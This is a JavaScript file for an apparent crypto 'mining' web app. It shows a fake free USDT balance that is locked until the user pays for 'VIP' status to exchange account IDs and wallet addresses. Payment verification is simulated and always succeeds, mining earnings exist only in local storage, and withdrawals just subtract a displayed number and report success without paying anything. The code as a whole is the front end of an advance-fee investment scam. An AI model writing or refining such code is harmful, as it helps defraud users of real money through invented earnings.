class MiningSystem {
    constructor() {
        this.userData = this.loadUserData();
        this.paymentConfig = {
            bitget: { id: '9879164714', wallet: 'TXYZ123BitgetWallet' },
            bybit: { id: '269645993', wallet: 'TXYZ456BybitWallet' }
        };
        this.initializeApp();
        this.startAutoUpdate();
    }

    initializeApp() {
        this.setupEventListeners();
        this.updateDisplay();
        this.generateUserId();
    }

    loadUserData() {
        const saved = localStorage.getItem('miningUserData');
        if (saved) {
            return JSON.parse(saved);
        }
        
        return {
            userId: this.generateUserId(),
            balance: 0,
            vipLevel: 0,
            vipBalance: 0,
            freeBalance: 6,
            totalMined: 0,
            lastClaim: {},
            activeDays: 1,
            referralEarnings: 0,
            teamSize: 0,
            lastUpdate: Date.now()
        };
    }

    generateUserId() {
        let userId = localStorage.getItem('miningUserId');
        if (!userId) {
            userId = 'USER_' + Math.random().toString(36).substr(2, 9).toUpperCase();
            localStorage.setItem('miningUserId', userId);
        }
        return userId;
    }

    saveUserData() {
        this.userData.lastUpdate = Date.now();
        localStorage.setItem('miningUserData', JSON.stringify(this.userData));
    }

    setupEventListeners() {
        // Claim buttons
        document.getElementById('claim1').addEventListener('click', () => this.claimReward('vip1'));
        document.getElementById('claim2').addEventListener('click', () => this.claimReward('vip2'));
        document.getElementById('claimFree').addEventListener('click', () => this.claimFreeReward());

        // Payment buttons
        document.querySelectorAll('.payment-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const vipLevel = e.target.getAttribute('data-vip');
                const exchange = e.target.getAttribute('data-exchange');
                this.showPaymentModal(vipLevel, exchange);
            });
        });

        // Withdraw buttons
        document.getElementById('fastWithdraw').addEventListener('click', () => this.fastWithdraw());
        document.getElementById('normalWithdraw').addEventListener('click', () => this.normalWithdraw());

        // Modal close
        document.querySelector('.close').addEventListener('click', () => this.closeModal());
        document.getElementById('confirmPayment').addEventListener('click', () => this.confirmPayment());
        
        window.addEventListener('click', (e) => {
            if (e.target === document.getElementById('paymentModal')) {
                this.closeModal();
            }
        });
    }

    claimReward(minerType) {
        if (this.userData.vipLevel < parseInt(minerType.replace('vip', ''))) {
            this.showNotification(`VIP ${minerType.replace('vip', '')} required for this miner!`, 'error');
            return;
        }

        const now = Date.now();
        const lastClaim = this.userData.lastClaim[minerType] || 0;
        const cooldown = 2 * 60 * 60 * 1000; // 2 hours in milliseconds

        if (now - lastClaim < cooldown) {
            const remaining = cooldown - (now - lastClaim);
            this.showNotification(`Please wait ${this.formatTime(remaining)} before next claim!`, 'warning');
            return;
        }

        let reward = 0;
        switch(minerType) {
            case 'vip1':
                reward = 0.5;
                break;
            case 'vip2':
                reward = 2.0;
                break;
        }

        this.userData.vipBalance += reward;
        this.userData.totalMined += reward;
        this.userData.lastClaim[minerType] = now;
        
        this.saveUserData();
        this.updateDisplay();
        
        this.showNotification(`🎉 Successfully claimed ${reward} USDT from ${minerType.toUpperCase()}!`, 'success');
        this.animateClaim(minerType);
    }

    claimFreeReward() {
        if (this.userData.freeBalance <= 0) {
            this.showNotification('Free reward already claimed!', 'warning');
            return;
        }

        this.userData.freeBalance = 0;
        this.userData.balance += 6;
        this.saveUserData();
        this.updateDisplay();
        
        this.showNotification('🎁 6 USDT Free reward claimed! VIP required to withdraw.', 'success');
    }

    showPaymentModal(vipLevel, exchange) {
        const modal = document.getElementById('paymentModal');
        const amount = vipLevel === '1' ? '1 USDT' : '10 USDT';
        const wallet = this.paymentConfig[exchange].wallet;
        
        document.getElementById('paymentAmount').textContent = amount;
        document.getElementById('walletAddress').textContent = wallet;
        document.getElementById('paymentExchange').textContent = exchange.charAt(0).toUpperCase() + exchange.slice(1);
        document.getElementById('paymentVipLevel').textContent = vipLevel;
        document.getElementById('paymentUserId').textContent = this.userData.userId;
        
        // Store current payment info
        this.currentPayment = { vipLevel: parseInt(vipLevel), exchange };
        
        modal.style.display = 'block';
    }

    closeModal() {
        document.getElementById('paymentModal').style.display = 'none';
    }

    confirmPayment() {
        if (!this.currentPayment) return;
        
        this.showNotification('🔄 Checking payment status...', 'info');
        
        // Simulate payment verification (in real app, this would call your backend)
        setTimeout(() => {
            this.userData.vipLevel = this.currentPayment.vipLevel;
            this.saveUserData();
            this.updateDisplay();
            this.closeModal();
            
            this.showNotification(`🎉 VIP ${this.currentPayment.vipLevel} Activated Successfully!`, 'success');
        }, 2000);
    }

    fastWithdraw() {
        const amount = parseFloat(document.getElementById('fastWithdrawAmount').value);
        
        if (!amount || amount <= 0) {
            this.showNotification('Please enter a valid amount!', 'error');
            return;
        }

        if (amount > this.userData.vipBalance) {
            this.showNotification('Insufficient VIP balance!', 'error');
            return;
        }

        this.userData.vipBalance -= amount;
        this.saveUserData();
        this.updateDisplay();
        
        this.showNotification(`🚀 Withdrawal request for ${amount} USDT submitted!`, 'success');
        document.getElementById('fastWithdrawAmount').value = '';
    }

    normalWithdraw() {
        const amount = parseFloat(document.getElementById('normalWithdrawAmount').value);
        
        if (this.userData.vipLevel === 0) {
            this.showNotification('VIP membership required to withdraw free funds!', 'error');
            return;
        }

        if (!amount || amount <= 0) {
            this.showNotification('Please enter a valid amount!', 'error');
            return;
        }

        if (amount > this.userData.balance) {
            this.showNotification('Insufficient free balance!', 'error');
            return;
        }

        this.userData.balance -= amount;
        this.saveUserData();
        this.updateDisplay();
        
        this.showNotification(`💸 Normal withdrawal for ${amount} USDT processed!`, 'success');
        document.getElementById('normalWithdrawAmount').value = '';
    }

    updateDisplay() {
        // Update balances
        document.getElementById('totalBalance').textContent = (this.userData.balance + this.userData.vipBalance).toFixed(2) + ' USDT';
        document.getElementById('vipBalance').textContent = this.userData.vipBalance.toFixed(2) + ' USDT';
        document.getElementById('freeBalance').textContent = this.userData.balance.toFixed(2) + ' USDT';
        
        // Update VIP status and withdraw buttons
        const vipLevelElement = document.getElementById('vipLevel');
        const normalWithdrawBtn = document.getElementById('normalWithdraw');
        
        if (this.userData.vipLevel === 0) {
            vipLevelElement.textContent = 'No VIP';
            vipLevelElement.style.background = 'linear-gradient(45deg, #666, #999)';
            normalWithdrawBtn.classList.add('disabled');
            normalWithdrawBtn.textContent = 'Withdraw (Locked)';
        } else {
            vipLevelElement.textContent = `VIP ${this.userData.vipLevel}`;
            vipLevelElement.style.background = 'linear-gradient(45deg, #ffd700, #ffed4e)';
            normalWithdrawBtn.classList.remove('disabled');
            normalWithdrawBtn.textContent = 'Withdraw Now';
        }

        // Update statistics
        document.getElementById('totalMined').textContent = this.userData.totalMined.toFixed(2) + ' USDT';
        document.getElementById('activeDays').textContent = this.userData.activeDays;
        document.getElementById('referralEarnings').textContent = this.userData.referralEarnings.toFixed(2) + ' USDT';
        document.getElementById('teamSize').textContent = this.userData.teamSize;

        // Update claim timers
        this.updateClaimTimers();
    }

    updateClaimTimers() {
        const now = Date.now();
        
        ['vip1', 'vip2'].forEach(miner => {
            const lastClaim = this.userData.lastClaim[miner] || 0;
            const cooldown = 2 * 60 * 60 * 1000;
            const remaining = cooldown - (now - lastClaim);
            
            if (remaining > 0) {
                document.getElementById(`nextClaim${miner.replace('vip', '')}`).textContent = this.formatTime(remaining);
            } else {
                document.getElementById(`nextClaim${miner.replace('vip', '')}`).textContent = 'Ready!';
            }
        });
    }

    formatTime(ms) {
        const hours = Math.floor(ms / (1000 * 60 * 60));
        const minutes = Math.floor((ms % (1000 * 60 * 60)) / (1000 * 60));
        return `${hours}h ${minutes}m`;
    }

    animateClaim(minerType) {
        const button = document.querySelector(`[data-miner="${minerType}"]`);
        button.style.animation = 'pulse 0.5s ease';
        setTimeout(() => {
            button.style.animation = '';
        }, 500);
    }

    showNotification(message, type = 'info') {
        // Remove existing notification
        const existing = document.querySelector('.notification');
        if (existing) existing.remove();

        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <span>${message}</span>
            <button onclick="this.parentElement.remove()">×</button>
        `;

        // Add styles
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: ${type === 'error' ? '#ff4757' : type === 'success' ? '#2ed573' : type === 'warning' ? '#ffa502' : '#3742fa'};
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            z-index: 10000;
            display: flex;
            align-items: center;
            gap: 10px;
            animation: slideInRight 0.3s ease;
        `;

        document.body.appendChild(notification);

        // Auto remove after 5 seconds
        setTimeout(() => {
            if (notification.parentElement) {
                notification.remove();
            }
        }, 5000);
    }

    startAutoUpdate() {
        // Update every minute
        setInterval(() => {
            this.updateDisplay();
        }, 60000);

        // Simulate daily active days update
        setInterval(() => {
            const now = new Date();
            const lastUpdate = new Date(this.userData.lastUpdate);
            
            if (now.getDate() !== lastUpdate.getDate()) {
                this.userData.activeDays++;
                this.saveUserData();
            }
        }, 60000);
    }
}

// Copy wallet address function
function copyWalletAddress() {
    const walletAddress = document.getElementById('walletAddress').textContent;
    navigator.clipboard.writeText(walletAddress).then(() => {
        const miningSystem = window.miningSystem;
        miningSystem.showNotification('Wallet address copied to clipboard!', 'success');
    });
}

// Initialize the app when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.miningSystem = new MiningSystem();
    
    // Add notification styles
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideInRight {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .notification button {
            background: none;
            border: none;
            color: white;
            font-size: 18px;
            cursor: pointer;
            padding: 0;
            width: 20px;
            height: 20px;
        }
    `;
    document.head.appendChild(style);
});
